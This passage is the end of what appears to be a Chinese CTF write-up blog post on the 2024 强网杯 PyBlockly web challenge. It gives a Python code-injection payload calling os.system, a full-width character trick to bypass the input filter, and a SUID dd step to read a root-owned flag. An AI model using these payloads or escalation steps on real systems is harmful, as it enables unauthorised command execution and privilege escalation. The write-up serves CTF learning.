+<p>通过网站根目录 JS 服务发送的请求体中，是 <code>[&#39;blocks&#39;][blocks][&#39;type&#39;]==&#39;print&#39;</code> ，因此最终 code 代码会被 <code>f&quot;print(&#123;text&#125;)&quot;</code> 包裹</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if block_type == &#x27;print&#x27;:</span><br><span class="line">    text_block = block[&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]</span><br><span class="line">    text = block_to_python(text_block)</span><br><span class="line">    code = f&quot;print(&#123;text&#125;)&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>最终命令注入时闭合： <code>&#39;);xxxx#</code></p>
+<p>最终 Payload </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);locals().update(&#123;&quot;len&quot;:lambda x:4&#125;);__import__(&quot;os&quot;).system(&quot;whoami&quot;)#</span><br></pre></td></tr></table></figure></div>
+
+<p>半角转全角</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">＇）；ｌｏｃａｌｓ（）．ｕｐｄａｔｅ（｛＂ｌｅｎ＂：ｌａｍｂｄａ ｘ：４｝）；＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂ｗｈｏａｍｉ＂）＃</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107183154329.png" class title="image-20241107183154329">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107183037523.png" class title="image-20241107183037523">
+
+<p>flag 文件权限级为 <code>root</code> ，当前权限为 <code>ctf</code> </p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107183713575.png" class title="image-20241107183713575">
+
+<p>dd 具有SUID位，有 <code>root</code> 权限，直接利用 <code>dd if=$FILES</code> 读取文件</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107184411083.png" class title="image-20241107184411083">
+
+
+
+
+
+
+
+
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 2024强网杯部分Web复现</li>
+        <li><strong>作者:</strong> Octopus</li>
+        <li><strong>创建于
+                :</strong> 2025-03-05 20:44:03</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-03-05 20:51:10
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2025/03/05/2024强网杯部分Web复现/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Java%E5%AE%89%E5%85%A8/">#Java安全</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Java反序列化学习记录 - CC1 &amp;&amp; CC6</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">2024强网杯部分Web复现</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2024-%E5%BC%BA%E7%BD%91%E6%9D%AF-platform"><span class="nav-text">[2024 强网杯]platform</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2024-%E5%BC%BA%E7%BD%91%E6%9D%AF-PyBlockly"><span class="nav-text">[2024 强网杯]PyBlockly</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Octopus</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 6 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+    
+<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>
+
+
+	
+</body>
+
+</html>
